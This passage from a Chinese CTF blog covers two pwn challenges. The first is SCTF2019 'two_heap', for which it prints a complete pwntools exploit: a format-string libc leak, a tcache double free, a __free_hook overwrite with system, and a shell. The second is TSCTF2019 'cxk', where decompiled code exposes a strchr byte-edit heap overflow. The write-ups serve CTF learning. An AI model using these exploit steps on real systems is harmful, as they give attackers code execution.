<p>malloc的size被8对齐处理，之后放入node[0]，chunk_addr放入node[1]。size开始都被初始化为0x80，且每次malloc的size不能与已经malloc的相同(指8对齐后的size)。且这里检查了bss里有无stdout地址。malloc的数量最多为8个。</p>
<p><img src="/2020/09/03/SCTF2019/two_heap/1.jpg" alt="malloc"></p>
<p><img src="/2020/09/03/SCTF2019/two_heap/2.jpg" alt="malloc2"></p>
<p>free这里存在double free。</p>
<p><img src="/2020/09/03/SCTF2019/two_heap/3.jpg" alt="free"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>__printf_chk可以用”%a%2$a%3$a”泄露出栈地址，根据固定偏移算出libc地址。</p>
<p>分配一个size=0的chunk，double free再malloc一个size=0x10的chunk修改fd，malloc一个size=0x8的chunk，再malloc一个size=0x18的即可分配到free_hook，改成system，最后free一个”/bin/sh\x00”的块拿shell</p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">gadgets = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>,<span class="number">0xe569f</span>,<span class="number">0xe5858</span>,<span class="number">0xe585f</span>,<span class="number">0xe5863</span>,<span class="number">0x10a398</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(p,size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Input the size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Input the note:\n'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(p,index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Input the index:\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(p)</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    p.recvuntil(<span class="string">'Welcome to SCTF:\n'</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">'%a%2$a%3$a'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'0x0.0'</span>)</span><br><span class="line">    recv = <span class="string">'0x'</span>+p.recvuntil(<span class="string">'p'</span>,drop=<span class="literal">True</span>)+<span class="string">'0'</span></span><br><span class="line">    <span class="keyword">print</span> (recv)</span><br><span class="line">    libc_base = int(recv,<span class="number">16</span>) - <span class="number">0x861a590</span></span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">    malloc_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    shell_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Input the size:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'0'</span>)<span class="comment">#0</span></span><br><span class="line">    Delete(p,<span class="number">0</span>)</span><br><span class="line">    Delete(p,<span class="number">0</span>)</span><br><span class="line">    New(p,<span class="number">0x10</span>,p64(malloc_hook)+<span class="string">'\n'</span>)<span class="comment">#1</span></span><br><span class="line">    New(p,<span class="number">0x8</span>,<span class="string">'a\n'</span>)<span class="comment">#2</span></span><br><span class="line">    New(p,<span class="number">0x18</span>,p64(shell_addr)+<span class="string">'\n'</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">    New(p,<span class="number">0x20</span>,<span class="string">'/bin/sh\x00\n'</span>)<span class="comment">#4</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    Delete(p,<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./two_heap'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'47.104.89.129'</span>,<span class="number">10002</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.26.so'</span>)</span><br><span class="line"></span><br><span class="line">exp(p)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>SCTF2019</category>
      </categories>
  </entry>
  <entry>
    <title>cxk</title>
    <url>/2020/09/03/tsctf2019/cxk/</url>
    <content><![CDATA[<h1 id="TSCTF2019-Final-cxk"><a href="#TSCTF2019-Final-cxk" class="headerlink" title="TSCTF2019 Final cxk"></a>TSCTF2019 Final cxk</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一次AWD，后来才知道一个题可以放多个漏洞，比赛的时候自己因为代码太多理不清自己乱掉了，心态真的很重要</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>这里有两个结构很类似的结构体，一个是AV，另一个是Letter，因为太相似了，只是内部的名字和含义不太一样，这里就写一个好了。</p>
<p>一个AV里面包括des_chunk_addr(描述的堆块指针)，av_number，下一个av_chunk，上一个av_chunk，，和des_size。</p>
<p>Letter里面把description换成了reason，即包含reason_addr和reason_size。</p>
<p><img src="/2020/09/03/tsctf2019/cxk/1.jpg" alt="struct"></p>
<p>程序有非常多功能…这里只介绍我用到的地方，主menu的1和2，menu2的功能1(AddAV)</p>
<p><img src="/2020/09/03/tsctf2019/cxk/2.jpg" alt="menu"></p>
<p><img src="/2020/09/03/tsctf2019/cxk/3.jpg" alt="menu1"></p>
<p><img src="/2020/09/03/tsctf2019/cxk/4.jpg" alt="menu2"></p>
<p>先看menu2的AddAv，最开始prev_av即0x6030f8位置的值为0x6030e0，所以第一次分配的时候check_addr的next_chunk和prev_chunk为0x6030e0。prev_av-&gt;next_chunk即0x6030f0的值写入了第一次分配的check_addr，这个check_addr同时被写入到0x6030f8，自此0x6030f0就作为链表的第一个节点，0x6030f8作为最后一个有效节点(其next_chunk为0x6030e0)，故遍历直到0x6030e0作为结束。</p>
<p>这里分配AV的时候先读av_number，不存在已有的av_number方可分配，read_int是按照16进制转换输入，description的size限制在0x400内，每次先分配description，再分配固定大小为0x28的check_chunk。(最多分配48个AV)</p>
<p>下面是程序的第一个主功能(围绕Letter展开)</p>
<p>Letter的结构和AV很像，des改成reason理解就好。SendLawyerLetter可以当成Malloc，每次分配一个av_number的Letter前需要先有一个AV，链表的首节点改为0x603130，最后一个有效节点为0x603138，尾节点为0x603120。(这里有个check不管它)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">SendLawerLetter</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> found; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-44h]</span></span><br><span class="line">  __int64 av_number; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  Av *i; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  Av *j; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">void</span> *reason_addr; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  Av *av_addr; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  av_number = <span class="number">0L</span>L;</span><br><span class="line">  size = <span class="number">0L</span>L;</span><br><span class="line">  reason_addr = <span class="number">0L</span>L;</span><br><span class="line">  i = <span class="number">0L</span>L;</span><br><span class="line">  j = <span class="number">0L</span>L;</span><br><span class="line">  found = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  buf = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( dword_6030CC &lt;= <span class="number">48</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dword_6030D0 &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      write(<span class="number">1</span>, <span class="string">"Please input av number:"</span>, <span class="number">0x17</span>uLL);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%lld"</span>, &amp;av_number);</span><br><span class="line">      <span class="keyword">for</span> ( i = (Av *)qword_6030F0; i != (Av *)&amp;unk_6030E0; i = (Av *)i-&gt;next_chunk )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( i-&gt;av_number == av_number )</span><br><span class="line">        &#123;</span><br><span class="line">          found = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;                                         <span class="comment">// 每个Letter需要对应先有一个AV</span></span><br><span class="line">      <span class="keyword">if</span> ( found )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( j = (Av *)qword_603130; j != (Av *)&amp;unk_603120; j = (Av *)j-&gt;next_chunk )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( j-&gt;av_number == av_number )</span><br><span class="line">          &#123;</span><br><span class="line">            v2 = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"You play CTF just like CXK!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          write(<span class="number">1</span>, <span class="string">"Please input the size of reason:"</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">          size = (<span class="keyword">signed</span> <span class="keyword">int</span>)read_number();</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">signed</span> __int64)size &gt; <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> __int64)size &lt;= <span class="number">0x400</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            reason_addr = <span class="built_in">malloc</span>(size);</span><br><span class="line">            write(<span class="number">1</span>, <span class="string">"Reason:"</span>, <span class="number">7u</span>LL);</span><br><span class="line">            get_input(<span class="number">0L</span>L, (__int64)reason_addr, size);</span><br><span class="line">            av_addr = (Av *)<span class="built_in">malloc</span>(<span class="number">0x28</span>uLL);</span><br><span class="line">            write(<span class="number">1</span>, <span class="string">"check:"</span>, <span class="number">6u</span>LL);</span><br><span class="line">            buf = (<span class="keyword">unsigned</span> __int16)av_addr &amp; <span class="number">0xFFF</span>;</span><br><span class="line">            write(<span class="number">1</span>, &amp;buf, <span class="number">2u</span>LL);</span><br><span class="line">            write(<span class="number">1</span>, <span class="string">"\n"</span>, <span class="number">1u</span>LL);</span><br><span class="line">            av_addr-&gt;av_number = av_number;</span><br><span class="line">            av_addr-&gt;des_chunk_addr = (__int64)reason_addr;</span><br><span class="line">            LODWORD(av_addr-&gt;des_size) = size;</span><br><span class="line">            av_addr-&gt;next_chunk = (__int64)&amp;unk_603120;</span><br><span class="line">            av_addr-&gt;prev_chunk = (__int64)qword_603138;</span><br><span class="line">            qword_603138-&gt;next_chunk = (__int64)av_addr;</span><br><span class="line">            qword_603138 = av_addr;</span><br><span class="line">            ++dword_6030CC;                     <span class="comment">// total chunk</span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"You play CTF just like CXK!"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"You play CTF just like CXK!"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You play CTF just like CXK!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Too much lawyer letter!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/03/tsctf2019/cxk/5.jpg" alt="set"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">AddAV</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> is_exist; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  __int64 av_number; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  Av *i; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">void</span> *des_addr; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  Av *check_addr; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  av_number = <span class="number">0L</span>L;</span><br><span class="line">  size = <span class="number">0L</span>L;</span><br><span class="line">  des_addr = <span class="number">0L</span>L;</span><br><span class="line">  i = <span class="number">0L</span>L;</span><br><span class="line">  is_exist = <span class="number">0</span>;</span><br><span class="line">  buf = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( dword_6030D0 &lt;= <span class="number">48</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"Please input av number:"</span>, <span class="number">0x17</span>uLL);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%lld"</span>, &amp;av_number);</span><br><span class="line">    <span class="keyword">for</span> ( i = (Av *)qword_6030F0; i != (Av *)&amp;unk_6030E0; i = (Av *)i-&gt;next_chunk )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( i-&gt;av_number == av_number )</span><br><span class="line">      &#123;</span><br><span class="line">        is_exist = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( is_exist )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You play CTF just like CXK!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      write(<span class="number">1</span>, <span class="string">"Please input the size of description:"</span>, <span class="number">0x25</span>uLL);</span><br><span class="line">      size = (<span class="keyword">signed</span> <span class="keyword">int</span>)read_number();</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">signed</span> __int64)size &gt; <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> __int64)size &lt;= <span class="number">0x400</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        des_addr = <span class="built_in">malloc</span>(size);</span><br><span class="line">        write(<span class="number">1</span>, <span class="string">"Description:"</span>, <span class="number">0xC</span>uLL);</span><br><span class="line">        get_input(<span class="number">0L</span>L, (__int64)des_addr, size);</span><br><span class="line">        check_addr = (Av *)<span class="built_in">malloc</span>(<span class="number">0x28</span>uLL);</span><br><span class="line">        write(<span class="number">1</span>, <span class="string">"check:"</span>, <span class="number">6u</span>LL);</span><br><span class="line">        buf = (<span class="keyword">unsigned</span> __int16)check_addr &amp; <span class="number">0xFFF</span>;</span><br><span class="line">        write(<span class="number">1</span>, &amp;buf, <span class="number">2u</span>LL);                   <span class="comment">// ？？？</span></span><br><span class="line">        write(<span class="number">1</span>, <span class="string">"\n"</span>, <span class="number">1u</span>LL);</span><br><span class="line">        check_addr-&gt;av_number = av_number;</span><br><span class="line">        check_addr-&gt;des_chunk_addr = (__int64)des_addr;</span><br><span class="line">        LODWORD(check_addr-&gt;des_size) = size;</span><br><span class="line">        check_addr-&gt;next_chunk = (__int64)&amp;unk_6030E0;</span><br><span class="line">        check_addr-&gt;prev_chunk = (__int64)prev_av;</span><br><span class="line">        prev_av-&gt;next_chunk = (__int64)check_addr;</span><br><span class="line">        prev_av = check_addr;</span><br><span class="line">        ++dword_6030D0;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"You play CTF just like CXK!"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Too much video!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>EditStatement类似Edit函数，这里的strchr函数在des_chunk中寻找一个用户的字符，改为新字符，这里存在漏洞。比如我们分配的des_chunk大小为0x18，数据填充’a’*0x18，那么我们old_chr为’\x31’，new_chr为’\x91’即可将与des_chunk相邻的letter_chunk的size改为0x61，同理可以往后继续改，只要构造数据得当，可以溢出很远。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">EditStatment</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> is_exist; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  __int64 av_number; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  Av *v3; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> *character_index; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> old_charcter; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> new_character; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  av_number = <span class="number">0L</span>L;</span><br><span class="line">  v3 = <span class="number">0L</span>L;</span><br><span class="line">  is_exist = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( dword_6030CC &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"The Judge is too stingy that you only allowed to change a character a time"</span>);</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"Please input the av_number for statement you want to change:"</span>, <span class="number">0x3C</span>uLL);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%lld"</span>, &amp;av_number);</span><br><span class="line">    v3 = (Av *)qword_603130;</span><br><span class="line">    <span class="keyword">while</span> ( v3-&gt;av_number != av_number )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = (Av *)v3-&gt;next_chunk;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == (Av *)&amp;unk_603120 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">    is_exist = <span class="number">1</span>;</span><br><span class="line">LABEL_7:</span><br><span class="line">    <span class="keyword">if</span> ( is_exist )</span><br><span class="line">    &#123;</span><br><span class="line">      write(<span class="number">1</span>, <span class="string">"Please input the old character:"</span>, <span class="number">0x1F</span>uLL);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)read(<span class="number">0</span>, &amp;old_charcter, <span class="number">2u</span>LL) &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"You play CTF just like CXK!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      write(<span class="number">1</span>, <span class="string">"Please input the new character:"</span>, <span class="number">0x1F</span>uLL);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)read(<span class="number">0</span>, &amp;new_character, <span class="number">2u</span>LL) &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"You play CTF just like CXK!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      character_index = <span class="built_in">strchr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)v3-&gt;des_chunk_addr, old_charcter);</span><br><span class="line">      *character_index = new_character;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You play CTF just like CXK!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You play CTF just like CXK!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Revoke函数类似Free，先free掉des_chunk再free掉letter_chunk，没有清空数据</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">Revoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> is_exist; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  __int64 av_number; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  Av *ptr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  av_number = <span class="number">0L</span>L;</span><br><span class="line">  ptr = <span class="number">0L</span>L;</span><br><span class="line">  is_exist = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( dword_6030CC &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"Please input the av_number for lawyer letter you want to revoke:"</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%lld"</span>, &amp;av_number);</span><br><span class="line">    ptr = (Av *)qword_603130;</span><br><span class="line">    <span class="keyword">while</span> ( ptr-&gt;av_number != av_number )</span><br><span class="line">    &#123;</span><br><span class="line">      ptr = (Av *)ptr-&gt;next_chunk;</span><br><span class="line">      <span class="keyword">if</span> ( ptr == (Av *)&amp;unk_603120 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">    is_exist = <span class="number">1</span>;</span><br><span class="line">LABEL_7:</span><br><span class="line">    <span class="keyword">if</span> ( is_exist )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)(ptr-&gt;prev_chunk + <span class="number">16</span>) = ptr-&gt;next_chunk;</span><br><span class="line">      *(_QWORD *)(ptr-&gt;next_chunk + <span class="number">24</span>) = ptr-&gt;prev_chunk;</span><br><span class="line">      <span class="built_in">free</span>((<span class="keyword">void</span> *)ptr-&gt;des_chunk_addr);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">      --dword_6030CC;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You play CTF just like CXK!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You play CTF just like CXK!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ShowLawyerLetter类似Puts函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">ShowLawyerLetter</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> is_exist; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  __int64 av_number; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  Av *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  av_number = <span class="number">0L</span>L;</span><br><span class="line">  v3 = <span class="number">0L</span>L;</span><br><span class="line">  is_exist = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( dword_6030CC &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"Please input the av_number for lawyer letter you want to see:"</span>, <span class="number">0x3D</span>uLL);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%lld"</span>, &amp;av_number);</span><br><span class="line">    v3 = (Av *)qword_603130;</span><br><span class="line">    <span class="keyword">while</span> ( v3-&gt;av_number != av_number )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = (Av *)v3-&gt;next_chunk;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == (Av *)&amp;unk_603120 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">    is_exist = <span class="number">1</span>;</span><br><span class="line">LABEL_7:</span><br><span class="line">    <span class="keyword">if</span> ( is_exist )</span><br><span class="line">    &#123;</span><br><span class="line">      write(<span class="number">1</span>, <span class="string">"Reason:"</span>, <span class="number">7u</span>LL);</span><br><span class="line">      write(<span class="number">1</span>, (<span class="keyword">const</span> <span class="keyword">void</span> *)v3-&gt;des_chunk_addr, SLODWORD(v3-&gt;des_size));</span><br><span class="line">      write(<span class="number">1</span>, <span class="string">"\n"</span>, <span class="number">1u</span>LL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You play CTF just like CXK!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You play CTF just like CXK!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
